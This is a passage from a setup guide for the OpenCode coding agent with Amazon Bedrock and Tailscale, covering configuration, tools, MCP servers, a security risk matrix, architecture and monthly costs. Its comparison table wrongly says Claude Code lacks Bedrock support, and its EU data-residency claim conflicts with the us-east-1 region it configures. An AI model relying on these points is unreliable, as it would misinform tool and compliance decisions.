- Environment variables: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_REGION`
- Bearer token: `AWS_BEARER_TOKEN_BEDROCK`
- AWS profiles, shared credentials, IAM roles, Web Identity Tokens

**Prerequisite:** Request model access in the Amazon Bedrock console first.

**Project config** (`opencode.json` in project root, safe to commit):

```json
{
  "provider": {
    "bedrock": {
      "models": {
        "qwen3-coder-480b": {
          "name": "Qwen3 Coder 480B A35B"
        },
        "deepseek-r1": {
          "name": "DeepSeek R1"
        }
      }
    }
  }
}
```

For VPC endpoint (private connectivity), set a custom endpoint:

```json
{
  "provider": {
    "bedrock": {
      "options": {
        "endpoint": "https://vpce-XXXX.bedrock-runtime.us-east-1.vpce.amazonaws.com"
      }
    }
  }
}
```

API keys are stored separately at `~/.local/share/opencode/auth.json` (or via `/connect` command).

### 9.4 Built-in Tools

OpenCode comes with tools that map directly to coding workflows:

| Tool | Description | Security Note |
|---|---|---|
| File read/write | Exact string replacement for precise edits | Reads any file in workspace |
| Bash/shell execution | Run terminal commands | Executes with your user privileges |
| Web search | Via Exa AI (no API key needed) | Queries may contain code context |
| Web fetch | Read web pages and docs | Subject to SSRF if model crafts URLs |
| File search / grep | Search across the codebase | Full workspace access |
| LSP integration | Language Server Protocol for code intelligence | Local only |

### 9.5 MCP Server Integration

OpenCode implements an MCP client, enabling connection to external tool servers. This is how you would add Tailscale management, custom search APIs, or S3 file operations:

```json
{
  "mcp": {
    "brave-search": {
      "type": "stdio",
      "command": "npx",
      "args": ["-y", "@anthropic/mcp-brave-search"],
      "env": {
        "BRAVE_API_KEY": "${BRAVE_API_KEY}"
      }
    },
    "s3-files": {
      "type": "stdio",
      "command": "npx",
      "args": ["-y", "@aws/mcp-s3"],
      "env": {
        "AWS_REGION": "us-east-1"
      }
    }
  }
}
```

### 9.6 Comparison with Alternatives

| Feature | OpenCode | Claude Code | Cursor | Aider |
|---|---|---|---|---|
| Type | CLI/TUI + Desktop + IDE | CLI/Terminal | Full IDE | CLI/Terminal |
| Cost | Free (+ API costs) | $20/mo (Pro) or API | $20/mo (Pro) | Free (+ API costs) |
| Model flexibility | 75+ providers, local | Anthropic only | Multi-provider | Multi-provider |
| Open source | Yes | No | No | Yes |
| Bedrock support | Native | No | No | Via liteLLM |
| Can run fully local | Yes (Ollama) | No | No | Yes (Ollama) |
| MCP support | Yes | Yes | Limited | No |
| Git integration | Basic | Deep | Visual diffs | Deep (auto-commits) |
| Key strength | Provider flexibility, free | Best agentic features | Best GUI experience | Git-first workflow |

### 9.7 Security Considerations for OpenCode

#### What OpenCode Can Access

OpenCode's agent capabilities are **powerful and unsandboxed**:

- Reads every file in your workspace
- Executes arbitrary shell commands with your user privileges
- Sends file contents to whichever LLM provider you configured
- Writes/modifies files including configs that may contain secrets

**The permission system is UX-only, not a security boundary.** OpenCode's docs explicitly state it helps users stay aware of actions but does not provide security isolation.

#### Risk Matrix (OpenCode + Bedrock + Tailscale)

| Threat | Risk | Mitigation |
|---|---|---|
| Code sent to AWS Bedrock | Accepted (contractual) | VPC endpoint, AWS DPA review |
| Code sent to third-party LLM | None if Bedrock-only | Don't configure other cloud providers |
| Shell command execution | HIGH | Review commands before approval |
| Secrets in workspace exposed to model | HIGH | Use `.gitignore`-aware tools, never store secrets in workspace |
| API keys stored in plaintext | MEDIUM | `~/.local/share/opencode/auth.json` — protect file permissions |
| Web search leaking code context | MEDIUM | Use private search API (Brave), review queries |
| SSRF via web fetch | MEDIUM | Don't enable web fetch tool, or use allowlisted proxy |

#### Recommended Security Configuration

1. **Run OpenCode in a container or VM** for true isolation (Docker recommended)
2. **Use Bedrock as sole provider** — no data leaves AWS infrastructure
3. **Disable web search/fetch tools** if not needed — reduces attack surface
4. **Tailscale ACLs** — restrict which machines can reach your Bedrock VPC endpoint
5. **Environment-based auth** — use `AWS_PROFILE` or IAM roles instead of hardcoded keys
6. **Review before executing** — always inspect shell commands the model suggests
7. **`.opencodeignore`** — exclude sensitive files/directories from the model's reach

### 9.8 Full Architecture: OpenCode + Bedrock + Tailscale

```
+----------------------------------------------------------+
|  DEVELOPER MACHINE                                       |
|                                                          |
|  +------------+     +------------------+                 |
|  | OpenCode   |---->| AWS SDK          |                 |
|  | (TUI/CLI)  |     | (credentials)    |                 |
|  +-----+------+     +--------+---------+                 |
|        |                     |                           |
|        |  MCP Servers        |  Tailscale Tunnel         |
|        v                     v                           |
|  +-----------+    +---------------------+                |
|  | Brave     |    | Tailscale Daemon    |                |
|  | Search    |    | (encrypted mesh)    |                |
|  | (local)   |    +----------+----------+                |
|  +-----------+               |                           |
+----------------------------------------------------------+
                               |
                    Encrypted WireGuard Tunnel
                               |
+----------------------------------------------------------+
|  AWS VPC (us-east-1)                                     |
|                                                          |
|  +-------------------+    +------------------+           |
|  | VPC Endpoint      |--->| Amazon Bedrock   |           |
|  | (bedrock-runtime) |    | (Qwen3/R1/etc.)  |           |
|  +-------------------+    +------------------+           |
|                                                          |
|  +-------------------+    +------------------+           |
|  | S3 Bucket         |    | CloudWatch       |           |
|  | (file storage)    |    | (logging, opt.)  |           |
|  +-------------------+    +------------------+           |
|                                                          |
|  +-------------------+                                   |
|  | Tailscale Subnet  |                                   |
|  | Router (t3.micro) |                                   |
|  +-------------------+                                   |
+----------------------------------------------------------+
```

**Data flow:**
1. You type a coding request in OpenCode's TUI
2. OpenCode sends it via AWS SDK to Bedrock through the Tailscale tunnel
3. Traffic enters the VPC via the Tailscale subnet router
4. Hits the VPC endpoint for Bedrock — never touches the public internet
5. Response returns through the same encrypted path
6. If tools are used (search, file ops), they execute locally or via MCP servers on your machine

### 9.9 Cost Summary (OpenCode + Bedrock + Tailscale, Solo Dev, eu-west-2, incl. 20% VAT)

| Component | Monthly Cost (EUR incl. VAT) |
|---|---|
| OpenCode | €0 (open source) |
| Bedrock inference (Qwen3 Coder 480B, medium use) | €25.75 |
| Tailscale Personal | €0 |
| EC2 t3.micro (subnet router) | €10.49 (or €0 if using own machine) |
| VPC Endpoint | €9.28 (optional but recommended) |
| S3 (file storage) | €1.20 |
| Brave Search API | €0 (free tier) |
| **Total (minimal)** | **~€27/mo** |
| **Total (recommended)** | **~€47/mo** |

With multi-model strategy (Qwen3 480B primary + Qwen3 30B for quick tasks): **~€32-40/mo**.

Compared to Claude Code Pro (~€22/mo incl. VAT) or Cursor Pro (~€22/mo incl. VAT), this setup costs slightly more but offers **full model flexibility, open-source transparency, data residency in EU, and complete infrastructure control**.